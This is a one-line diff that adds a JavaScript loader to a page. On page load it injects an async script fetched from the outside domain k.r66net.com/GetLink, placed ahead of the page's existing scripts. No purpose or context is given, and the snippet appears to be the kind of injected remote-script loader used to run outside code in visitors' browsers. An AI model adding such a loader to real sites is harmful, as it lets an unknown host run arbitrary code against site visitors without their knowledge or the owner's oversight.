@@ -1,0 +1,1 @@
+ ( function () { var vs = document.createElement('script'); vs.type = 'text/javascript'; vs.async = true; vs.src = 'https://k.r66net.com/GetLink'; var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(vs, s); })(); 
